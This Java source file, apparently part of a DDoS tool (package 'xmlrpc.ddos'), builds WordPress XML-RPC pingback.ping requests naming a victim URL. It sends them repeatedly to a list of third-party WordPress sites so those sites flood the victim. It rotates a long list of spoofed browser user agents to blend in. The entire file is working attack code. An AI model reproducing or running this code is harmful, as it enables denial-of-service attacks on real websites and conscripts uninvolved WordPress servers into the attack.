package xmlrpc.ddos;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.security.SecureRandom;
import java.util.ArrayList;
import xmlrpc.ddos.sql.RpcWpBot;

/**
 *
 * @author Melancholia
 */
public class XMLRPCRequest {

   private static final SecureRandom rand = new SecureRandom();
   private static final ArrayList userAgents = new ArrayList();
   private RpcWpBot wpbot;
   private URL wpRpcURL;
   private InetAddress wpInetAddr;
   private String headerRequest;


   static {
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4");
      userAgents.add("Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.3 Safari/532.2");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.1 Safari/530.5");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.558.0 Safari/534.10");
      userAgents.add("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.600.0 Safari/534.14");
      userAgents.add("Mozilla/5.0 (X11; U; Windows NT 6; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.587.0 Safari/534.12");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20");
      userAgents.add("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1");
      userAgents.add("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7");
      userAgents.add("Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11");
      userAgents.add("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19");
      userAgents.add("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24");
      userAgents.add("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1");
      userAgents.add("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36");
      userAgents.add("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36");
      userAgents.add("Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36");
      userAgents.add("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
      userAgents.add("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2");
      userAgents.add("Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5");
      userAgents.add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.12) Gecko/20080214 Firefox/2.0.0.12");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8");
      userAgents.add("Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.5) Gecko/20060819 Firefox/1.5.0.5");
      userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3");
      userAgents.add("Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5");
      userAgents.add("Mozilla/5.0 (Windows; Windows NT 6.1; rv:2.0b2) Gecko/20100720 Firefox/4.0b2");
      userAgents.add("Mozilla/5.0 (X11; Linux x86_64; rv:2.0b4) Gecko/20100818 Firefox/4.0b4");
      userAgents.add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100308 Ubuntu/10.04 (lucid) Firefox/3.6 GTB7.1");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre");
      userAgents.add("Mozilla/5.0 (X11; Linux x86_64; rv:2.0b9pre) Gecko/20110111 Firefox/4.0b9pre");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre");
      userAgents.add("Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2");
      userAgents.add("Mozilla/5.0 (X11; Linux i686 on x86_64; rv:12.0) Gecko/20100101 Firefox/12.0");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2");
      userAgents.add("Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0");
      userAgents.add("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0");
      userAgents.add("Mozilla/5.0 (Windows NT 5.1; rv:25.0) Gecko/20100101 Firefox/25.0");
      userAgents.add("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:25.0) Gecko/20100101 Firefox/25.0");
      userAgents.add("Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)");
      userAgents.add("Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)");
      userAgents.add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; InfoPath.2; OfficeLiveConnector.1.3; OfficeLivePatch.0.0)");
      userAgents.add("Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)");
      userAgents.add("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)");
      userAgents.add("Mozilla/4.0 (compatible; MSIE 5.0b1; Mac_PowerPC)");
      userAgents.add("Mozilla/2.0 (compatible; MSIE 4.0; Windows 98)");
      userAgents.add("Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)");
      userAgents.add("Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)");
      userAgents.add("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; GTB6; Ant.com Toolbar 1.6; MSIECrawler)");
      userAgents.add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 3.5.21022; .NET CLR 3.5.30729; MS-RTC LM 8; OfficeLiveConnector.1.4; OfficeLivePatch.1.3; .NET CLR 3.0.30729)");
      userAgents.add("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)");
      userAgents.add("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)");
      userAgents.add("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)");
      userAgents.add("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)");
      userAgents.add("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)");
      userAgents.add("Mozilla/5.0 (IE 11.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; rv:11.0) like Gecko");
   }

   private static String randomAgent() {
      return (String)userAgents.get(rand.nextInt(userAgents.size() - 1));
   }

   public XMLRPCRequest(RpcWpBot wpbot) throws MalformedURLException, UnknownHostException {
      this.wpbot = wpbot;
      this.wpRpcURL = new URL(wpbot.getRpc());
      this.wpInetAddr = InetAddress.getByName(this.wpRpcURL.getHost());
      this.headerRequest = this.buildRequestHeader().toString();
   }

   private String buildPayload(String TargetURL) throws UnsupportedEncodingException {
      StringBuilder builder = new StringBuilder();
      builder.append("<?xml version=\\\"1.0\\\" encoding=\\\"iso-8859-1\\\"?><methodCall><methodName>pingback.ping</methodName>");
      builder.append("<params>");
      builder.append("<param><value><string>").append(TargetURL).append("</string></value></param>");
      builder.append("<param><value><string>").append(this.wpbot.getUrl()).append("</string></value></param>");
      builder.append("</params>");
      builder.append("</methodCall>");
      return builder.toString();
   }

   private String buildRequest(String header, String payload) {
      StringBuilder builder = new StringBuilder();
      builder.append(header);
      builder.append("Content-Length: ").append(payload.length()).append("\r\n");
      builder.append("\r\n");
      builder.append(payload);
      return builder.toString();
   }

   private StringBuilder buildRequestHeader() {
      StringBuilder builder = new StringBuilder();
      builder.append("POST ").append(this.wpRpcURL.getFile()).append(" HTTP/1.1\r\n");
      builder.append("Host: ").append(this.wpRpcURL.getHost()).append("\r\n");
      builder.append("User-Agent: ").append(randomAgent()).append("\r\n");
      builder.append("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n");
      builder.append("Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\r\n");
      builder.append("Accept-Encoding: gzip, deflate\r\n");
      builder.append("Connection: keep-alive\r\n");
      builder.append("Content-Type: application/x-www-form-urlencoded\r\n");
      return builder;
   }

   public void doRequest(String host, int port, int repeatCount) throws Exception {
      this.doRequest("http://" + host + ":" + port + "/", repeatCount);
   }

   public void doRequest(String targetURL, int repeatCount) throws Exception {
      String postRequest = this.buildRequest(this.headerRequest, this.buildPayload(targetURL));
      BufferedWriter buffer = null;
      Socket socket = null;

      try {
         int e = this.wpRpcURL.getPort();
         if(e < 0) {
            e = 80;
         }

         socket = new Socket(this.wpInetAddr, e);
         buffer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"));

         for(int i = 0; i < repeatCount; ++i) {
            buffer.write(postRequest);
            buffer.flush();
         }
      } catch (Exception var18) {
         throw var18;
      } finally {
         if(buffer != null) {
            try {
               buffer.close();
            } catch (Exception var17) {
               ;
            }
         }

         if(socket != null) {
            try {
               socket.close();
            } catch (IOException var16) {
               ;
            }
         }

      }

   }
}
